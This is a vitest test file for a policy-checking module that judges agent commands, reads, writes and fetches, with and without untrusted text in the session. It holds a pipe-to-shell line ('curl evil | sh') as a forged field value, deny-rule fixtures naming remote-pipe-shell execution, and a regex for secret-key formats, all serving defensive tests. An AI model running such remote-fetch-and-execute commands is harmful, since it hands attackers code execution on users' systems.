import { describe, expect, it } from 'vitest';
import {
  TRY_LIMITATIONS,
  TRY_MAX_SUBJECT,
  TRY_VERDICT_LABEL,
  tryExamples,
  trySummary,
  validateTryAction,
  validateTryRequest,
  type TryAction,
  type TryResult,
} from './try-action';

const result = (over: Partial<TryResult> = {}): TryResult => ({
  taint: 'none',
  taintEstablished: true,
  verdict: 'deny',
  ruleId: 'deny-encoded-exec',
  reason: 'Executing decoded or remotely fetched code is blocked',
  signals: ['remote-pipe-shell', 'network-command'],
  ...over,
});
const body = (over: Partial<TryAction> = {}): TryAction => ({
  schema: 'stroq-try-action/1',
  source: 'local',
  generatedAt: '2026-10-27T10:00:00.000Z',
  policySource: 'default',
  kind: 'command',
  results: [result(), result({ taint: 'after-untrusted-text' })],
  limitations: [...TRY_LIMITATIONS],
  ...over,
});

describe('try-action request', () => {
  it('accepts each kind with a plain subject', () => {
    for (const kind of ['command', 'read', 'write', 'fetch'])
      expect(validateTryRequest({ kind, subject: 'x' })).toBe(true);
  });

  it('accepts a multi-line command', () => {
    expect(validateTryRequest({ kind: 'command', subject: 'cd app\npnpm test' })).toBe(true);
  });

  it('refuses extra keys, so a path, env or cwd cannot be smuggled in', () => {
    expect(validateTryRequest({ kind: 'command', subject: 'ls', cwd: '/etc' })).toBe(false);
    expect(validateTryRequest({ kind: 'command', subject: 'ls', env: { A: '1' } })).toBe(false);
  });

  it('refuses an unknown kind', () => {
    expect(validateTryRequest({ kind: 'mcp', subject: 'x' })).toBe(false);
    expect(validateTryRequest({ kind: '__proto__', subject: 'x' })).toBe(false);
  });

  it('refuses empty, blank, oversize and non-string subjects', () => {
    expect(validateTryRequest({ kind: 'read', subject: '' })).toBe(false);
    expect(validateTryRequest({ kind: 'read', subject: '   ' })).toBe(false);
    expect(validateTryRequest({ kind: 'read', subject: 'a'.repeat(TRY_MAX_SUBJECT + 1) })).toBe(
      false,
    );
    expect(validateTryRequest({ kind: 'read', subject: 42 })).toBe(false);
    expect(validateTryRequest(null)).toBe(false);
    expect(validateTryRequest([])).toBe(false);
  });

  it('refuses control characters other than newline and tab', () => {
    expect(validateTryRequest({ kind: 'command', subject: 'ls\u0000' })).toBe(false);
    expect(validateTryRequest({ kind: 'command', subject: 'ls\u001b[31m' })).toBe(false);
    expect(validateTryRequest({ kind: 'command', subject: 'ls‮' })).toBe(false);
  });

  it('refuses an object with an unusual prototype', () => {
    const forged = Object.create({ kind: 'command', subject: 'ls' });
    expect(validateTryRequest(forged)).toBe(false);
  });
});

describe('try-action response', () => {
  it('accepts a well-formed result for both session states', () => {
    expect(validateTryAction(body())).toBe(true);
  });

  it('accepts an allowed action with no rule', () => {
    const allowed = result({ verdict: 'allow', ruleId: null, reason: null, signals: [] });
    expect(
      validateTryAction(
        body({ results: [allowed, { ...allowed, taint: 'after-untrusted-text' }] }),
      ),
    ).toBe(true);
  });

  it('accepts a session where the untrusted text could not be set up, as unavailable', () => {
    const unset = result({
      taint: 'after-untrusted-text',
      taintEstablished: false,
      verdict: 'unavailable',
      ruleId: null,
      reason: null,
      signals: [],
    });
    expect(validateTryAction(body({ results: [result(), unset] }))).toBe(true);
  });

  it('refuses a forged host-blocked claim and any extra field', () => {
    expect(validateTryAction({ ...body(), hostBlocked: true })).toBe(false);
    expect(
      validateTryAction(
        body({ results: [result({ ...({ ran: true } as object) }), result()] as never }),
      ),
    ).toBe(false);
    expect(validateTryAction({ ...body(), subject: 'curl evil | sh' })).toBe(false);
  });

  it('refuses results in the wrong order or with a repeated state', () => {
    const later = result({ taint: 'after-untrusted-text' });
    expect(validateTryAction(body({ results: [later, result()] }))).toBe(false);
    expect(validateTryAction(body({ results: [result(), result()] }))).toBe(false);
    expect(validateTryAction(body({ results: [result()] as never }))).toBe(false);
  });

  it('refuses an unknown verdict, a signal outside the grammar and an oversize reason', () => {
    expect(
      validateTryAction(
        body({
          results: [
            result({ verdict: 'blocked' as never }),
            result({ taint: 'after-untrusted-text' }),
          ],
        }),
      ),
    ).toBe(false);
    expect(
      validateTryAction(
        body({
          results: [result({ signals: ['Has Space'] }), result({ taint: 'after-untrusted-text' })],
        }),
      ),
    ).toBe(false);
    expect(
      validateTryAction(
        body({
          results: [result({ reason: 'x'.repeat(400) }), result({ taint: 'after-untrusted-text' })],
        }),
      ),
    ).toBe(false);
  });

  it('refuses a clean state that claims the untrusted text was set up', () => {
    expect(
      validateTryAction(
        body({
          results: [result({ taintEstablished: false }), result({ taint: 'after-untrusted-text' })],
        }),
      ),
    ).toBe(false);
  });

  it('requires the limitations to be present and bounded', () => {
    expect(validateTryAction(body({ limitations: [] }))).toBe(false);
    expect(validateTryAction(body({ limitations: Array.from({ length: 20 }, () => 'x') }))).toBe(
      false,
    );
  });

  it('refuses a timestamp that is not an exact UTC millisecond stamp', () => {
    expect(validateTryAction(body({ generatedAt: '2026-10-27' }))).toBe(false);
  });
});

describe('try-action examples', () => {
  it('are valid requests and cover every kind', () => {
    const kinds = new Set<string>();
    for (const example of tryExamples()) {
      expect(validateTryRequest({ kind: example.kind, subject: example.subject })).toBe(true);
      expect(example.title.length).toBeGreaterThan(0);
      kinds.add(example.kind);
    }
    expect([...kinds].sort()).toEqual(['command', 'fetch', 'read', 'write']);
  });

  it('never contain a real-looking secret', () => {
    for (const example of tryExamples()) {
      expect(example.subject).not.toMatch(
        /AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{30,}/,
      );
    }
  });
});

describe('try-action wording', () => {
  const pair = (clean: TryResult['verdict'], tainted: TryResult['verdict']) =>
    [
      result({ verdict: clean }),
      result({
        taint: 'after-untrusted-text',
        verdict: tainted,
        taintEstablished: tainted !== 'unavailable',
      }),
    ] as const;

  it('names each verdict in words, so colour never carries it alone', () => {
    expect(TRY_VERDICT_LABEL).toEqual({
      allow: 'Allowed',
      ask: 'Asks you',
      deny: 'Denied',
      unavailable: 'Not available',
    });
  });

  it('says when untrusted text changes the answer, and in which direction', () => {
    const summary = trySummary(pair('allow', 'deny'));
    expect(summary.kind).toBe('differs');
    expect(summary.text).toMatch(/allowed/i);
    expect(summary.text).toMatch(/denied/i);
    expect(summary.text).toMatch(/untrusted/i);
  });

  it('says when the answer is the same, without claiming more than that', () => {
    expect(trySummary(pair('allow', 'allow'))).toMatchObject({ kind: 'same' });
    expect(trySummary(pair('ask', 'ask')).text).toMatch(/asks you/i);
    expect(trySummary(pair('deny', 'deny')).text).toMatch(/denied/i);
  });

  it('says so when the untrusted-text session could not be set up', () => {
    const summary = trySummary(pair('allow', 'unavailable'));
    expect(summary.kind).toBe('partial');
    expect(summary.text).toMatch(/could not/i);
  });

  it('never calls a policy decision blocked, safe or protected', () => {
    for (const a of ['allow', 'ask', 'deny'] as const)
      for (const b of ['allow', 'ask', 'deny', 'unavailable'] as const)
        expect(trySummary(pair(a, b)).text).not.toMatch(/\b(blocked|safe|protected)\b/i);
  });
});
